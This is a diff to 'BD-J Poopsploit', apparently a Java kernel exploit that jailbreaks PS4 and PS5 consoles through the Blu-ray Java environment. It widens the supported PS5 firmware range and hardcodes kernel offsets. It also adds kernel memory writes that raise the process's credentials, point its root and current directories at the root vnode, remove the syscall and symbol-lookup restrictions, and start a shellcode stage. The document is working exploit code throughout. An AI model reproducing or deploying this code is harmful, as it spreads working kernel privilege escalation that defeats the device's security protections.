@@ -15,7 +15,7 @@ import java.io.*;
 
 public class Poops {
     
-    private static final String VERSION_STRING = "BD-J Poopsploit 1.4";
+    private static final String VERSION_STRING = "BD-J Poopsploit 1.5";
     
     private static final int KERNEL_PID = 0;
     
@@ -202,7 +202,6 @@ public class Poops {
         }
         FW_VERSION = majorStr + "." + minorStr;
         PS4_KernelOffset.FW_VERSION = FW_VERSION;
-        PS5_KernelOffset.FW_VERSION = FW_VERSION;
     }
 
     private static int compareVersions(String v1, String v2) {
@@ -309,20 +308,20 @@ public class Poops {
             
         } else if (PLATFORM.equals("PS5")) {
             
-            if (compareVersions(FW_VERSION, "6.00") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
+            if (compareVersions(FW_VERSION, "4.03") < 0 || compareVersions(FW_VERSION, "12.00") > 0) {
                 NativeInvoke.sendNotificationRequest("UNSUPPORTED FW_VERSION");
                 Status.println("UNSUPPORTED FW_VERSION");
                 return false;
             }
             
-            FILEDESCENT_SIZE = PS5_KernelOffset.FILEDESCENT_SIZE;
-            KQ_FDP_OFFSET = PS5_KernelOffset.KQ_FDP_OFFSET;
-            PIPE_SIGIO_OFFSET = PS5_KernelOffset.PIPE_SIGIO_OFFSET;
-            IN6P_OUTPUTOPTS_OFFSET = PS5_KernelOffset.IN6P_OUTPUTOPTS_OFFSET;
-            IP6PO_RHI_RTHDR_OFFSET = PS5_KernelOffset.IP6PO_RHI_RTHDR_OFFSET;
-            ROOTVNODE_OFFSET = PS5_KernelOffset.ROOTVNODE_OFFSET;
-            FDT_OFILES_OFFSET = PS5_KernelOffset.FDT_OFILES_OFFSET;
-            P_PID_OFFSET = PS5_KernelOffset.P_PID_OFFSET;
+            FILEDESCENT_SIZE = 0x30;
+            KQ_FDP_OFFSET = 0xA8;
+            PIPE_SIGIO_OFFSET = 0xd8;
+            IN6P_OUTPUTOPTS_OFFSET = 0x120;
+            IP6PO_RHI_RTHDR_OFFSET = 0x70;
+            ROOTVNODE_OFFSET = 0x8;
+            FDT_OFILES_OFFSET = 0x8;
+            P_PID_OFFSET = 0xbc;
             
         } else {
             Status.println("UNSUPPORTED PLATFORM : " + PLATFORM);
@@ -428,14 +427,6 @@ public class Poops {
         return api.call(__sys_randomized_path, fd, pathBuf.address(), lenPtr.address());
     }
 
-    private static int kill_bdj() {
-        try {
-            Thread.sleep(1000);
-        } catch (InterruptedException e) { }
-        
-        return (int) api.call(kill, getpid(), 9);
-    }
-    
     private static int cpusetSetAffinity(int core) {
         Buffer mask = new Buffer(CPU_SET_SIZE);
         mask.putShort(0x00, (short) (1 << core));
@@ -836,7 +827,7 @@ public class Poops {
         // Leak kqueue.
         int attempts = 0;
         int kq = 0;
-        while (attempts < 50000) {
+        while (attempts < 10000) {
             kq = kqueue();
 
             // Leak with other rthdr.
@@ -1251,10 +1242,6 @@ public class Poops {
     }
 
     private static boolean ps5_jailbreak() {
-
-        kdata_base = allproc - PS5_KernelOffset.getOffset("ALLPROC");
-        
-        Status.println("kdata_base: " + Long.toHexString(kdata_base));
         
         long p = curproc;
         long p_ucred = kapi.kread64(p + 0x40);
@@ -1270,24 +1257,30 @@ public class Poops {
         kapi.kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[1]
         kapi.kwrite8(p_ucred + 0x83, (byte) 0x80); // cr_sceAttr[0]
         
-        // For some reason patching rootvnode makes BD-J crash when closing
-        // Restore it before closing
         // Allow root file system access.
-        
-/*         long rootvnode = getRootVnode();        
+        long rootvnode = getRootVnode();        
         long p_fd = kapi.kread64(p + 0x48);
         bdj_vnode = kapi.kread64(p_fd + 0x10);
         
-        Status.println("bdj_vnode: " + Long.toHexString(bdj_vnode)); */
+        kapi.kwrite64(p_fd + 0x08, rootvnode); // fd_cdir
+        kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
+        kapi.kwrite64(p_fd + 0x18, 0); // fd_jdir
+
+        // Allow syscall from everywhere.
+        long p_dynlib = kapi.kread64(p + 0x3e8);
+        kapi.kwrite64(p_dynlib + 0xf0, 0); // start
+        kapi.kwrite64(p_dynlib + 0xf8, 0xFFFFFFFFFFFFFFFFL); // end
         
-        // kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
+        // Allow dlsym.
+        long dynlib_eboot = kapi.kread64(p_dynlib + 0x00);
+        long eboot_segments = kapi.kread64(dynlib_eboot + 0x40);
+        kapi.kwrite64(eboot_segments + 0x08, 0); // addr
+        kapi.kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFFL); // size 
         
-        if (!GPU.run(kdata_base, curproc)) {
-            Status.println("GPU rw failed");
-            return false;
-        }
+        AioShellcode.start(allproc);
         
         return true;
+        
     }
     
     private static void cleanup() {
@@ -1454,12 +1447,6 @@ public class Poops {
             }
             
             cleanup();
-            
-            ElfLoader.start(kdata_base, kq_fdp);
-            
-            // This is temp fix
-            // kill bdj.elf otherwise BD-J crashes when closing app
-            kill_bdj();
             
         } else {
             cleanup();
